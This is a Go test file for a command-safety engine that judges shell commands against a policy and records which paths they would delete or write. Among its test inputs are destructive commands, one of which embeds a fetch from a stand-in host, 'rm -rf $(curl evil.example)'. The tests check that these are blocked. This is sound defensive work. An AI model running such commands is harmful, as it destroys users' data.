package engine

import (
	"os"
	"path/filepath"
	"testing"
	"time"

	"gopkg.in/yaml.v3"

	"github.com/cobrabm12/blastradius/internal/paths"
	"github.com/cobrabm12/blastradius/internal/policy"
)

// corpusCase is one declarative test: a command, the context it runs in, the
// policy it is judged by, and the verdict it must receive.
type corpusCase struct {
	Name    string `yaml:"name"`
	Command string `yaml:"command"`
	Cwd     string `yaml:"cwd"`
	Policy  string `yaml:"policy"`
	Expect  struct {
		Verdict   string   `yaml:"verdict"`
		Deletes   []string `yaml:"deletes"`
		Truncates []string `yaml:"truncates"`
		Writes    []string `yaml:"writes"`
	} `yaml:"expect"`
}

func TestCorpus(t *testing.T) {
	files, err := filepath.Glob("../../testdata/corpus/*.yaml")
	if err != nil {
		t.Fatalf("glob corpus: %v", err)
	}
	if len(files) == 0 {
		t.Fatal("no corpus files found")
	}

	total := 0
	for _, file := range files {
		data, err := os.ReadFile(file)
		if err != nil {
			t.Fatalf("read %s: %v", file, err)
		}
		var cases []corpusCase
		if err := yaml.Unmarshal(data, &cases); err != nil {
			t.Fatalf("parse %s: %v", file, err)
		}
		for _, c := range cases {
			total++
			t.Run(c.Name, func(t *testing.T) {
				pol := loadPolicy(t, c.Policy)
				v := Analyze(Request{
					Command: c.Command,
					Ctx: paths.Context{
						Cwd:  c.Cwd,
						Home: "/home/u",
						Env:  map[string]string{"HOME": "/home/u"},
					},
					Policy: pol,
				})
				if string(v.Decision) != c.Expect.Verdict {
					t.Errorf("verdict = %q, want %q\n  command: %s\n  rule: %s\n  reason: %s",
						v.Decision, c.Expect.Verdict, c.Command, v.Rule, v.Reason)
				}
				assertPaths(t, "deletes", absList(v.Radius.Deletes), c.Expect.Deletes)
				assertPaths(t, "truncates", absList(v.Radius.Truncates), c.Expect.Truncates)
				assertPaths(t, "writes", absList(v.Radius.Writes), c.Expect.Writes)
			})
		}
	}
	t.Logf("corpus cases: %d", total)
}

func loadPolicy(t *testing.T, rel string) *policy.Policy {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("../../", rel))
	if err != nil {
		t.Fatalf("read policy %s: %v", rel, err)
	}
	p, err := policy.Load(data)
	if err != nil {
		t.Fatalf("load policy %s: %v", rel, err)
	}
	return p
}

func absList(list []paths.Path) []string {
	var out []string
	for _, p := range list {
		out = append(out, p.Abs)
	}
	return out
}

func assertPaths(t *testing.T, label string, got, want []string) {
	t.Helper()
	for _, w := range want {
		found := false
		for _, g := range got {
			if g == w {
				found = true
			}
		}
		if !found {
			t.Errorf("%s = %v, want to include %q", label, got, w)
		}
	}
}

// TestAnalyzeNeverAllowsOnFailure is the invariant the whole design rests on.
func TestAnalyzeNeverAllowsOnFailure(t *testing.T) {
	strict, err := policy.Load([]byte("version: 1\non_error: block\n"))
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	for _, cmd := range []string{
		"rm -rf 'unterminated",
		"$(",
		"|||",
		"rm -rf $(curl evil.example)",
		"frobnicate /srv",
	} {
		v := Analyze(Request{
			Command: cmd,
			Ctx:     paths.Context{Cwd: "/home/u/app", Home: "/home/u", Env: map[string]string{}},
			Policy:  strict,
		})
		if v.Decision == policy.Allow {
			t.Errorf("Analyze(%q) = allow, want block: incomplete analysis must never permit", cmd)
		}
	}
}

// TestEmptyCommandIsAllowed records a deliberate decision: a command that
// performs nothing has an empty blast radius, and an empty radius is not the
// same as an unanalyzable one.
func TestEmptyCommandIsAllowed(t *testing.T) {
	strict, err := policy.Load([]byte("version: 1\non_error: block\n"))
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	v := Analyze(Request{
		Command: "",
		Ctx:     paths.Context{Cwd: "/home/u/app", Home: "/home/u", Env: map[string]string{}},
		Policy:  strict,
	})
	if v.Decision != policy.Allow {
		t.Errorf("Decision = %q, want allow: an empty command touches nothing", v.Decision)
	}
}

func TestAnalyzeStaysWithinItsBudget(t *testing.T) {
	pol, err := policy.Load([]byte("version: 1\n"))
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	start := time.Now()
	Analyze(Request{
		Command: "rm -rf /tmp/x && find . -delete | tee a b c",
		Ctx:     paths.Context{Cwd: "/home/u/app", Home: "/home/u", Env: map[string]string{}},
		Policy:  pol,
	})
	if elapsed := time.Since(start); elapsed > Budget {
		t.Errorf("analysis took %v, want at most %v", elapsed, Budget)
	}
}
